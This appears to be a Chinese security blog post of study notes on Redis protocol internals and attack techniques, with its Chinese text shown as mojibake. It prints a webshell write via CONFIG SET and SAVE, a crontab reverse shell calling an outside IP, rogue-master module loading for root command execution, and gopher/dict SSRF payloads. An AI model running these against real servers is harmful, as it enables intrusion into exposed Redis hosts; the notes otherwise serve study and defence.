<html>
  <head>
    <meta charset="utf-8" />
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>rediså®‰å…¨å­¦ä¹ å°è®° | xray æŠ€æœ¯åšå®¢</title>
<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790014149">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="rediså®‰å…¨å­¦ä¹ å°è®° | xray æŠ€æœ¯åšå®¢ - Atom Feed" href="https://blog.xray.cool/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-176727836-2');
</script>


    <meta name="description" content="åŸºç¡€
https://www.runoob.com/redis/redis-tutorial.html
ç¯å¢ƒ ï¼š ubuntu å®‰è£… redis
$sudo apt-get update
$sudo apt-get install redi..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://blog.xray.cool">
  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790014149" alt="">
  </a>
  <h1 class="site-title">
    xray æŠ€æœ¯åšå®¢
  </h1>
  <p class="site-description">
    
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives/" class="menu">
          å½’æ¡£
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              rediså®‰å…¨å­¦ä¹ å°è®°
            </h2>
            <div class="post-info">
              <span>
                2020-09-04
              </span>
              <span>
                27 min read
              </span>
              
            </div>
            
              <img class="post-feature-image" src="https://blog.xray.cool/post-images/learning-redis-security.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h1 id="åŸºç¡€">åŸºç¡€</h1>
<p>https://www.runoob.com/redis/redis-tutorial.html</p>
<p>ç¯å¢ƒ ï¼š ubuntu å®‰è£… redis</p>
<pre><code>$sudo apt-get update
$sudo apt-get install redis-server
$service redis-server start
$redis-cli
</code></pre>
<h2 id="redisè¿æ¥å‘½ä»¤">redisè¿æ¥å‘½ä»¤</h2>
<p><code>redis-cli -h 127.0.0.1 -p 6379</code></p>
<h2 id="è®¾ç½®é”®å€¼å¯¹">è®¾ç½®é”®å€¼å¯¹:</h2>
<p><code>set myKey abc</code></p>
<h2 id="å–å‡ºé”®å€¼å¯¹">å–å‡ºé”®å€¼å¯¹:</h2>
<p><code>get myKey</code></p>
<pre><code>127.0.0.1:6379&gt; set yulige 123123
OK
127.0.0.1:6379&gt; get yulige
&quot;123123&quot;
</code></pre>
<p>é€šè¿‡ncç›‘å¬æˆ–è€…socatæŠ“åŒ…çš„æ–¹æ³•<code>socat -v tcp-listen:6378,fork tcp-connect:localhost:6379</code>æˆ–è€…æ˜¯tcpdump<br>
<code>apt-get install tcpdump tcpdump -i eth0 port 6379 -o nopass.pcap</code><br>
å¯ä»¥å‘ç°å‘é€çš„æ•°æ®ä¸º</p>
<pre><code>*3
$3
set
$6
yulige
$6
123123
å’Œ
*2
$3
get
$6
yulige
</code></pre>
<h2 id="è·å–é…ç½®">è·å–é…ç½®</h2>
<p><code>CONFIG GET *</code></p>
<h2 id="ç¼–è¾‘é…ç½®">ç¼–è¾‘é…ç½®</h2>
<p>ä½ å¯ä»¥é€šè¿‡ä¿®æ”¹ redis.conf æ–‡ä»¶æˆ–ä½¿ç”¨<code>CONFIG set</code> å‘½ä»¤æ¥ä¿®æ”¹é…ç½®ã€‚<br>
https://www.runoob.com/redis/redis-conf.html</p>
<h2 id="æ•°æ®ç±»å‹">æ•°æ®ç±»å‹</h2>
<p>Redisæ”¯æŒäº”ç§æ•°æ®ç±»å‹ï¼šstringï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œhashï¼ˆå“ˆå¸Œï¼‰ï¼Œlistï¼ˆåˆ—è¡¨ï¼‰ï¼Œsetï¼ˆé›†åˆï¼‰åŠzset(sorted setï¼šæœ‰åºé›†åˆ)ã€‚</p>
<h2 id="æœåŠ¡å™¨é…ç½®">æœåŠ¡å™¨é…ç½®</h2>
<p><a href="https://woodwhales.cn/2019/01/01/008/">redis å­¦ä¹ ç¬”è®° | å®‰è£…ä¸å¯åŠ¨</a></p>
<pre><code>sed -i 's/daemonize no/daemonize yes/g' /etc/redis-5.0.8/redis.conf
</code></pre>
<p>åå°è¿è¡Œredis</p>
<h2 id="è®¤è¯">è®¤è¯</h2>
<p>redisè®¾ç½®å¯†ç çš„ä¸¤ç§æ–¹æ³•<br>
redis-cliè¿ä¸Šå»<br>
<code>config set requirepass 123456</code><br>
æˆ–è€…ä¿®æ”¹redis.conf</p>
<pre><code>sed -i 's/# requirepass foobared/requirepass foobared/g' /etc/redis/redis.conf
</code></pre>
<p>ç¬¬äºŒç§æ–¹æ³•è®¾ç½®å®Œä¹‹åéœ€è¦é‡å¯redisã€‚</p>
<p>ç„¶åå†ç”¨redis-cliå»è¿çš„æ—¶å€™éœ€è¦å…ˆæ‰§è¡ŒAUTHå‘½ä»¤æ‰å¯ä»¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚<br>
<code>AUTH PASSWORD</code><br>
redis-cli -açš„å‚æ•°æœ¬è´¨æ˜¯å°±æ˜¯AUTHå‘½ä»¤ã€‚ç„¶åå› ä¸ºå®¢æˆ·ç«¯å°†å‘½ä»¤å‘é€åˆ°RedisæœåŠ¡å™¨çš„æµç¨‹ä¸º</p>
<p>å®¢æˆ·ç«¯å‘RedisæœåŠ¡å™¨å‘é€ä¸€ä¸ªä»…ç”±Bulk Stringsç»„æˆçš„RESP Arraysã€‚<br>
RedisæœåŠ¡å™¨å›å¤å‘é€ä»»ä½•æœ‰æ•ˆRESPæ•°æ®ç±»å‹ä½œä¸ºå›å¤çš„å®¢æˆ·ç«¯ã€‚https://www.anquanke.com/post/id/181599<br>
æ‰€ä»¥åœ¨ssrfçš„æ—¶å€™åªè¦åœ¨å‰é¢åŠ ä¸Šæ·»åŠ <code>%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123123%0D%0A</code>ï¼Œå³å¯ã€‚</p>
<h2 id="æ•°æ®åº“å¤‡ä»½">æ•°æ®åº“å¤‡ä»½</h2>
<p>Redis SAVE å‘½ä»¤ç”¨äºåˆ›å»ºå½“å‰æ•°æ®åº“çš„å¤‡ä»½ã€‚å¸¸è§åˆ©ç”¨å…¶æ¥å†™æ–‡ä»¶è¾¾åˆ°getshellçš„ç›®çš„ã€‚</p>
<pre><code>redis-cli -h 127.0.0.1 flushall #æ¸…ç©ºæ‰€æœ‰key
redis-cli -h 127.0.0.1 config set dir /var/www #è®¾ç½®æ•°æ®åº“å¤‡ä»½ä¿å­˜çš„ç›®å½•
redis-cli -h 127.0.0.1 config set dbfilename shell.php #è®¾ç½®æ•°æ®åº“å¤‡ä»½ä¿å­˜çš„æ–‡ä»¶å
redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot; #å°†æƒ³å†™å…¥çš„å†…å®¹å†™è¿›keyå€¼
redis-cli -h 127.0.0.1 save # å¤‡ä»½
</code></pre>
<h2 id="ä¸»ä»å¤åˆ¶">ä¸»ä»å¤åˆ¶</h2>
<p>ä¸»ä»å¤åˆ¶ï¼Œæ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼›æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯å°RedisæœåŠ¡å™¨éƒ½æ˜¯ä¸»èŠ‚ç‚¹ï¼›ä¸”ä¸€ä¸ªä¸»èŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªä»èŠ‚ç‚¹(æˆ–æ²¡æœ‰ä»èŠ‚ç‚¹)ï¼Œä½†ä¸€ä¸ªä»èŠ‚ç‚¹åªèƒ½æœ‰ä¸€ä¸ªä¸»èŠ‚ç‚¹ã€‚</p>
<p>https://www.cnblogs.com/kismetv/p/9236731.html#t2</p>
<p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤<br>
<code>slaveof host port</code><br>
ä¹‹åå‘ç”Ÿäº†å“ªäº›äº‹æƒ…å‘¢ã€‚</p>
<pre><code>&gt; 2020/04/10 09:30:01.182183  length=14 from=0 to=13
*1\r
$4\r
PING\r
&lt; 2020/04/10 09:30:01.182422  length=7 from=0 to=6
+PONG\r
&gt; 2020/04/10 09:30:01.182595  length=49 from=14 to=62
*3\r
$8\r
REPLCONF\r
$14\r
listening-port\r
$4\r
6379\r
&lt; 2020/04/10 09:30:01.182875  length=5 from=7 to=11
+OK\r
&gt; 2020/04/10 09:30:01.183002  length=59 from=63 to=121
*5\r
$8\r
REPLCONF\r
$4\r
capa\r
$3\r
eof\r
$4\r
capa\r
$6\r
psync2\r
&lt; 2020/04/10 09:30:01.183203  length=5 from=12 to=16
+OK\r
&gt; 2020/04/10 09:30:01.183300  length=72 from=122 to=193
*3\r
$5\r
PSYNC\r
$40\r
c8848089bebcde2b8d5a19e751a7bc4a260c88f8\r
$4\r
1275\r
&lt; 2020/04/10 09:30:01.183838  length=59 from=17 to=75
+FULLRESYNC da9658e1e4cbeb49c3f12e478d2a61179cb8c0f2 1274\r
&lt; 2020/04/10 09:30:01.280693  length=197 from=76 to=272
$191\r
REDIS0009.      redis-ver.5.0.8.
redis-bits.@..ctime..&lt;.^.\bused-mem.P.....repl-stream-db...\arepl-id(da9658e1e4cbeb49c3f12e478d2a61179cb8c0f2.\vrepl-offset....\faof-preamble.........{.{....{..l..]d.^&gt; 2020/04/10 09:30:01.284087  length=1 from=194 to=194

&gt; 2020/04/10 09:30:02.184067  length=37 from=195 to=231
*3\r
$8\r
REPLCONF\r
$3\r
ACK\r
$4\r
1274\r

</code></pre>
<p>è½¬æ¢æˆrediscommandæ˜¯</p>
<pre><code>&gt; PING
PONG
&gt; REPLCONF listening-port 4444
OK
&gt; replconf capa eof capa psync2
OK
&gt; psync c8848089bebcde2b8d5a19e751a7bc4a260c88f8 1275
+FULLRESYNC da9658e1e4cbeb49c3f12e478d2a61179cb8c0f2 1274 +[rdbå¤‡ä»½]
</code></pre>
<p>ä»¥ä¸Šå°±æ˜¯ä¸»ä»å¤åˆ¶çš„å…¨è¿‡ç¨‹ï¼Œå¯ä»¥ç±»ä¼¼äºæ•°æ®åº“å¤‡ä»½äº†ï¼Œ</p>
<p><strong>ç„¶åå› ä¸ºredisé‡‡ç”¨çš„respåè®®çš„éªŒè¯éå¸¸ç®€æ´ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨pythonæ¨¡æ‹Ÿä¸€ä¸ªredisæœåŠ¡çš„äº¤äº’ï¼Œå¹¶ä¸”å°†å¤‡ä»½çš„rdbæ•°æ®åº“å¤‡ä»½æ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºæ¶æ„çš„soæ–‡ä»¶ï¼Œç„¶åå°±ä¼šè‡ªåŠ¨åœ¨èŠ‚ç‚¹redisä¸­ç”Ÿæˆexp.so,å†ç”¨module loadå‘½ä»¤åŠ è½½soæ–‡ä»¶å³å¯å®Œæˆrceï¼Œè¿™å°±æ˜¯å‰æ®µæ—¶é—´éå¸¸ç«çš„åŸºäºä¸»ä»å¤åˆ¶çš„redisrceçš„åŸç†</strong></p>
<p>åŸºäºredisä¸»ä»å¤åˆ¶çš„rceï¼Œå¯ä»¥è¯´å·²ç»æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„äº†ã€‚</p>
<p>https://paper.seebug.org/975/</p>
<p>æ­£å¸¸å†™crontab</p>
<pre><code>127.0.0.1:6379&gt; config set dir /var/spool/cron/crontabs
OK
127.0.0.1:6379&gt; config set dbfilename root
OK
127.0.0.1:6379&gt; get 1
&quot;\n* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;115.28.78.16\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'\n&quot;
127.0.0.1:6379&gt; save
OK
</code></pre>
<p>è€Œè¿™ç§æ–¹å¼æ˜¯é€šè¿‡å†™æ–‡ä»¶æ¥å®ŒæˆGetShellçš„ï¼Œè¿™ç§æ–¹å¼çš„ä¸»è¦é—®é¢˜åœ¨äºï¼Œredisä¿å­˜çš„æ•°æ®å¹¶ä¸æ˜¯ç®€å•çš„jsonæˆ–è€…æ˜¯csvï¼Œæ‰€ä»¥å†™å…¥çš„æ–‡ä»¶éƒ½ä¼šæœ‰å¤§é‡çš„æ— ç”¨æ•°æ®ï¼Œå½¢ä¼¼</p>
<pre><code>[padding]
* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;115.28.78.16\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'
[padding]
</code></pre>
<p>æ­£æ˜¯å› ä¸ºredisä¼šåœ¨å†™å…¥çš„æ•°æ®å‰é¢æœ‰paddingï¼Œæ‰€ä»¥æˆ‘æƒ³ç”¨redisæœ¬èº«çš„åŠŸèƒ½å»å†™å…¥soæ–‡ä»¶æ¥å®Œæˆrceæ˜¯ä¸å¯èƒ½äº†ï¼Œå› ä¸ºelfæ ¼å¼çš„ä¸¥æ ¼æ€§ï¼Œä½†æ˜¯åœ¨åé¢paddingå€’æ˜¯å¹¶æ— å½±å“ã€‚</p>
<p>åŒç†ï¼Œåœ¨ä¸»ä»å¤åˆ¶rceè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ˜¯ä¸¤ä¸ªæ­£å¸¸çš„redisæœåŠ¡ä¹‹é—´å»ºç«‹è”ç³»ï¼Œä»…ä»…æ˜¯ç›¸å½“äºçš„æ•°æ®åº“å¤‡ä»½çš„å¤åˆ¶ï¼Œè€Œåœ¨ä¸»èŠ‚ç‚¹åŠ è½½çš„moduleæ˜¯ä¸ä¼šåˆ°èŠ‚ç‚¹å»çš„ã€‚æ‰€ä»¥åœ¨ä¸Šä¼ soè¿™æ¡è·¯ä¸Šåªèƒ½å‡­å€Ÿäºwebåº”ç”¨çš„ä¸Šä¼ ï¼Œç»è¿‡æµ‹è¯•ï¼Œåªéœ€è¦æœ‰è¯»æƒé™å³å¯ï¼Œè€Œwww-dataé»˜è®¤å†™å…¥çš„æ–‡ä»¶æƒé™æ˜¯644ï¼Œ<strong>æ‰€ä»¥å®æˆ˜ä¸­å®Œå…¨å¯ä»¥ç»“åˆä¸Šä¼ æ¥å®Œæˆæ”»å‡»</strong>ã€‚</p>
<p>ä¸»ä»å¤åˆ¶çš„åˆ©ç”¨åœºæ™¯åœ¨äº<strong>èŠ‚ç‚¹æœåŠ¡å¯ä»¥è®¿é—®ä¸»èŠ‚ç‚¹</strong>ï¼Œå› ä¸ºåªè¦ä¸»èŠ‚ç‚¹å¯ä»¥è¿”å›åŒ…å°±è¡Œäº†ï¼Œå¤åˆ¶æ•°æ®åº“æ˜¯ä»è¿”å›çš„åŒ…é‡Œé¢å»è·å–çš„ã€‚æ‰€ä»¥åªè¦é˜²ç«å¢™å…è®¸å¯ä»¥å‡ºæ¥å¤–ç½‘å°±è¡Œäº†ã€‚</p>
<p>ç„¶åé…åˆssrfå»æ”»å‡»redisã€‚</p>
<p>åœ¨ssrfçš„æ”»å‡»redisçš„è¿‡ç¨‹ä¸­ï¼Œè‹¥redisç‰ˆæœ¬åœ¨4.0ä»¥ä¸Šï¼Œåˆ™åˆ©ç”¨ä¸»ä»å¤åˆ¶åŠŸèƒ½ä¼ å…¥soæ–‡ä»¶å®Œæˆrceã€‚è‹¥åœ¨4ä»¥ä¸‹ï¼Œé™¤äº†ç›´æ¥ç”¨gopherå‘åŒ…å†™æ–‡ä»¶ä¹‹å¤–ï¼Œ<strong>åŒæ ·å¯ä»¥ç»“åˆä¸»ä»å¤åˆ¶æ¥ä¼ å…¥keyå€¼ä»è€Œå†™æ–‡ä»¶æ¥getshellã€‚</strong></p>
<p>è¡¥å……ï¼š</p>
<p>æ¯ä¸ªRedisèŠ‚ç‚¹(æ— è®ºä¸»ä»)ï¼Œåœ¨å¯åŠ¨æ—¶éƒ½ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªéšæœºID(æ¯æ¬¡å¯åŠ¨éƒ½ä¸ä¸€æ ·)ï¼Œç”±40ä¸ªéšæœºçš„åå…­è¿›åˆ¶å­—ç¬¦ç»„æˆï¼›runidç”¨æ¥å”¯ä¸€è¯†åˆ«ä¸€ä¸ªRedisèŠ‚ç‚¹ã€‚é€šè¿‡info Serverå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹èŠ‚ç‚¹çš„runidï¼š</p>
<p><code>redis-cli info server | grep &quot;run_id&quot;</code></p>
<p>å¦‚æœä»èŠ‚ç‚¹ä¹‹å‰æœªæ‰§è¡Œè¿‡slaveofæˆ–æœ€è¿‘æ‰§è¡Œäº†<code>slaveof no one</code>åˆ™ä»èŠ‚ç‚¹å‘é€å‘½ä»¤ä¸º<code>psync ? -1</code>ï¼Œå‘ä¸»èŠ‚ç‚¹è¯·æ±‚å…¨é‡å¤åˆ¶ï¼›<br>
å¦‚æœä»èŠ‚ç‚¹ä¹‹å‰æ‰§è¡Œäº†slaveofï¼Œåˆ™å‘é€å‘½ä»¤ä¸º<code>psync &lt;runid&gt; &lt;offset&gt;</code>ï¼Œå…¶ä¸­runidä¸ºä¸Šæ¬¡å¤åˆ¶çš„ä¸»èŠ‚ç‚¹çš„runidï¼Œoffsetä¸ºä¸Šæ¬¡å¤åˆ¶æˆªæ­¢æ—¶ä»èŠ‚ç‚¹ä¿å­˜çš„å¤åˆ¶åç§»é‡ã€‚</p>
<h2 id="åŠ è½½åŠ¨æ€é“¾æ¥åº“">åŠ è½½åŠ¨æ€é“¾æ¥åº“</h2>
<p>https://zhuanlan.zhihu.com/p/44685035</p>
<p>ä»¥å¾€æˆ‘ä»¬æƒ³ç»™ Redis åŠ ä¸ªåŠŸèƒ½æˆ–ç±»ä¼¼äº‹åŠ¡çš„ä¸œè¥¿åªèƒ½ç”¨ Lua è„šæœ¬ï¼Œè¿™ä¸ªä¸œè¥¿æ²¡æœ‰å®ç°çœŸæ­£çš„åŸå­æ€§ï¼Œå¦å¤–ä¹Ÿæ— æ³•ä½¿ç”¨åº•å±‚çš„ API ï¼Œå®è´¨ä¸Šæ¯”å•çº¯çš„å‘½ä»¤è„šæœ¬æå‡æœ‰é™ã€‚</p>
<p><strong>Redis 4.0 ç»ˆäºåŠ å…¥äº†æ¨¡å—</strong>ï¼Œæš´éœ²äº†å¿…è¦çš„ APIï¼Œå¹¶ä¸”æœ‰è‡ªåŠ¨å†…å­˜ç®¡ç†ï¼ˆå¤§å¤§å‡è½»ç¼–å†™è´Ÿæ‹…ï¼‰ï¼ŒåŸºäº C99ï¼ˆC++ æˆ–è€…å…¶å®ƒè¯­è¨€çš„ C ç»‘å®šæ¥å£å½“ç„¶ä¹Ÿå¯ä»¥ï¼‰ã€‚</p>
<p><code>MODULE LOAD /path/to/mymodule.so</code>    åœ¨ redis-cli ä¸­æ‰§è¡Œï¼Œæ³¨æ„è¿™é‡Œ mymodule.so æ˜¯æ–‡ä»¶å</p>
<h3 id="rce">rce</h3>
<p>å…¶å®æœ¬è´¨æ˜¯<strong>Redis Lua Sandbox Escape</strong>ç»•è¿‡çš„ä»£ç å…·ä½“è§ https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</p>
<pre><code>127.0.0.1:6379&gt; module load /tmp/exppadding.so
OK
127.0.0.1:6379&gt; system.exec &quot;id&quot;
&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;
</code></pre>
<p>å‚è€ƒ https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf å’Œè‡ªå·±å®éªŒ å‘ç°4ä»¥ä¸Šç‰ˆæœ¬é€šæ€ï¼Œredisä½œè€…ä¹Ÿæ²¡æœ‰ä¿®çš„æ„æ€ ï¼Œå› ä¸º http://antirez.com/news/96 ä½œè€…è§‰å¾—å¦‚æœè¢«ç™»é™†ä¸Šredisä¹‹åå¯èƒ½äº§ç”Ÿçš„å®‰å…¨æ€§é—®é¢˜ä»–å°±ä¸ç®¡äº†ï¼Œä»–æ²¡å¿…è¦å»æŠŠè¿™ç™¾åˆ†ä¹‹1çš„åŠŸèƒ½å¤æ‚åŒ–ã€‚</p>
<p>ç»¼ä¸Šæ‰€è¿° ï¼Œ redis4.0ä»¥ä¸Šæ·»åŠ äº†åŠ è½½åŠ¨æ€é“¾æ¥åº“çš„æ·»åŠ æ‰©å±•åŠŸèƒ½ï¼Œè€Œä½¿ç”¨<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK">Redis Lua Sandbox Escape</a>çš„expå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè‡ªå®šä¹‰äº†system.execå‡½æ•°æ¥å®Œæˆrceï¼Œå¹¶ä¸”å°†ç»“æœå›æ˜¾ã€‚</p>
<h1 id="dictåè®®å’Œgopheråè®®æ”»å‡»redis">dictåè®®å’Œgopheråè®®æ”»å‡»redis</h1>
<h2 id="gopher">gopher</h2>
<p>åšä¸€ä¸‹å¯¹æ¯”ï¼šç›´è¿ä¸Šredisæ‰§è¡Œ<code>set 1 123</code></p>
<pre><code>&gt; 2020/04/10 14:15:14.919897  length=29 from=62 to=90
*3\r
$3\r
set\r
$1\r
1\r
$3\r
123\r
&lt; 2020/04/10 14:15:14.920096  length=5 from=19 to=23
+OK\r
</code></pre>
<p>ä»€ä¹ˆæ˜¯gopheråè®®ã€‚å®ƒæ˜¯äº’è”ç½‘ä¸Šä½¿ç”¨çš„åˆ†å¸ƒå‹çš„æ–‡ä»¶æœé›†è·å–ç½‘ç»œåè®®ã€‚gopheræ”¯æŒå¤šè¡Œã€‚å› æ­¤è¦åœ¨ä¼ è¾“çš„æ•°æ®å‰å®¶ä¸€ä¸ªæ— ç”¨å­—ç¬¦ã€‚æ¯”å¦‚<code>gopher://ip:port/_</code>  é€šå¸¸ç”¨<code>_</code>ï¼Œå¹¶ä¸æ˜¯åªèƒ½ç”¨<code>_</code>ï¼Œgopheråè®®ä¼šå°†ç¬¬ä¸€ä¸ªå­—ç¬¦&quot;åƒæ‰&quot;ã€‚</p>
<p>gopheråè®®çš„è¯ç›´æ¥å°±å½“socketåŒ…å‘å°±è¡Œï¼Œæ³¨æ„ä¸€ä¸‹redisæ˜¯RESPåè®®çš„è§„åˆ™ï¼Œä¸Šé¢è¯´äº†ã€‚<br>
respåè®®è§„åˆ™ https://www.anquanke.com/post/id/181599</p>
<pre><code>å®¢æˆ·ç«¯å°†å‘½ä»¤å‘é€åˆ°RedisæœåŠ¡å™¨çš„æµç¨‹ä¸º

å®¢æˆ·ç«¯å‘RedisæœåŠ¡å™¨å‘é€ä¸€ä¸ªä»…ç”±Bulk Stringsç»„æˆçš„RESP Arraysã€‚
RedisæœåŠ¡å™¨å›å¤å‘é€ä»»ä½•æœ‰æ•ˆRESPæ•°æ®ç±»å‹ä½œä¸ºå›å¤çš„å®¢æˆ·ç«¯ã€‚
Bulk Stringsç”¨äºè¡¨ç¤ºé•¿åº¦æœ€å¤§ä¸º512 MBçš„å•ä¸ªäºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²ï¼ŒæŒ‰ä»¥ä¸‹æ–¹å¼ç¼–ç ï¼š

ä¸€ä¸ª$å­—èŠ‚åè·Ÿç»„æˆå­—ç¬¦ä¸²çš„å­—èŠ‚æ•°ï¼ˆä¸€ä¸ªå‰ç¼€é•¿åº¦ï¼‰ï¼Œç”±CRLFç»ˆæ­¢ã€‚
å®é™…çš„å­—ç¬¦ä¸²æ•°æ®ã€‚
æœ€ç»ˆçš„CRLFã€‚
</code></pre>
<pre><code>yulige@yulige-ubuntu:~$ curl &quot;gopher://0.0.0.0:4444/_*3%0d%0A%243%0d%0Aset%0d%0A%241%0d%0A1%0d%0A%243%0d%0A123&quot;
+OK

</code></pre>
<pre><code>&gt; 2020/04/10 14:16:55.477293  length=29 from=0 to=28
*3\r
$3\r
set\r
$1\r
1\r
$3\r
123\r
&lt; 2020/04/10 14:16:55.477561  length=5 from=0 to=4
+OK\r
</code></pre>
<p><code>get key</code>ä¹Ÿå¯ä»¥æ­£å¸¸è·å–åˆ°å­—ç¬¦ä¸²123ï¼Œå®Œå…¨ä¸€è‡´ã€‚</p>
<h2 id="dict">dict</h2>
<p>dictåè®®çš„è¯ä¹‹å‰äº†è§£çš„ä¸å¤šï¼ŒåªçŸ¥é“å¯ä»¥ç”¨æ¥æ¢æµ‹ç«¯å£ä¿¡æ¯<code>curl dict://localhost:22/info</code>ï¼Œç½‘ä¸Šæœäº†ä¸€ä¸‹å¤§æ¦‚æ˜¯è¿™ä¹ˆæè¿°çš„<code>dictåè®®æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼šdict://serverip:port/name:data å‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚ name dataï¼Œå¹¶åœ¨æœ«å°¾ è‡ªåŠ¨è¡¥ä¸Šrn(CRLF)</code>ç»“æœæµ‹è¯•å…¶å®è¿˜ä¼šå‘é€ä¸€ä¸ªQUITã€‚</p>
<p>ä¸ºäº†è¿›ä¸€æ­¥ç†è§£dictåè®®ï¼Œæˆ‘ç¿»äº†ä¸€ä¸‹<a href="http://www.dict.org/rfc2229.txt">rfcæ–‡æ¡£</a>ï¼Œå‘ç°æˆ‘ä¹‹å‰çš„ç†è§£éƒ½æ˜¯é”™è¯¯çš„ã€‚</p>
<pre><code>Command lines must be complete with all required parameters, and may not contain more than one command.
</code></pre>
<p>è¯´æ˜äº† ç¦æ­¢å¤šè¡Œå‘½ä»¤ã€‚å°è¯•äº†ä¸€ä¸‹ä¹Ÿæ²¡æ³•crlfç»•è¿‡å»ï¼Œä»–æ˜¯æŠŠä¸€æ•´ä¸ªcommandå­—ç¬¦ä¸²åŒ–äº†ï¼Œæ²¡æ³•é€ƒé€¸å‡ºæ¥ã€‚<br>
æµ‹è¯•</p>
<pre><code>yulige@yulige-ubuntu:~$ curl &quot;dict://0.0.0.0:6379/auth yuligesec\r\ninfo&quot;
-NOAUTH Authentication required.
-ERR invalid password
+OK
</code></pre>
<p>æ”¶åˆ°çš„</p>
<pre><code>CLIENT libcurl 7.63.0
auth yuligesec\r\ninfo
QUIT
</code></pre>
<p>æ­£å› å¦‚æ­¤ï¼Œdictåè®®æ²¡æ³•æ”»å‡»éœ€è¦è®¤è¯çš„redisã€‚</p>
<p>ä½¿ç”¨dictåè®®éœ€è¦ç”¨:æ¥ä½œä¸ºåˆ†éš”.ç»è¿‡æµ‹è¯•ä¹Ÿå¯ä»¥ä¸åŠ ï¼Œç›´æ¥ç©ºæ ¼å³å¯ã€‚rfcé‡Œé¢ä¹Ÿæ˜¯è¿™ä¹ˆå†™çš„ã€‚</p>
<pre><code>yulige@yulige-ubuntu:~$ curl &quot;dict://0.0.0.0:4444/set:1:123&quot;
-ERR Syntax error, try CLIENT (LIST | KILL ip:port | GETNAME | SETNAME connection-name)
+OK
+OK
</code></pre>
<p>å¯ä»¥çœ‹åˆ°å±…ç„¶è¿”å›äº†2ä¸ªokï¼Œè¯´æ˜å‘é€äº†ä¸¤æ¡å‘½ä»¤ã€‚</p>
<pre><code>&gt; 2020/04/10 14:23:28.776420  length=40 from=0 to=39
CLIENT libcurl 7.63.0\r
set 1 123\r
QUIT\r
&lt; 2020/04/10 14:23:28.777950  length=99 from=0 to=98
-ERR Syntax error, try CLIENT (LIST | KILL ip:port | GETNAME | SETNAME connection-name)\r
+OK\r
+OK\r
</code></pre>
<p>å¯ä»¥çœ‹åˆ°å…¶å®å‘é€äº†3è¡Œå‘½ä»¤ï¼Œè€Œä¸”å¹¶ä¸æ˜¯RESPåè®®æ ¼å¼çš„ã€‚ç¬¬ä¸€è¡Œåº”è¯¥æ˜¯ä»£è¡¨å‘å‡ºçš„cliçš„å·¥å…·å’Œç‰ˆæœ¬ï¼Œrfcä¸Šä¹Ÿæ˜¯è¿™ä¹ˆå†™çš„</p>
<pre><code>This command allows the client to provide information about itself for possible logging and statistical purposes.  All clients SHOULD send this command after connecting to the server.  All DICT servers MUST implement this command (note, though, that the server doesn't have to do anything with the information provided by the client).
</code></pre>
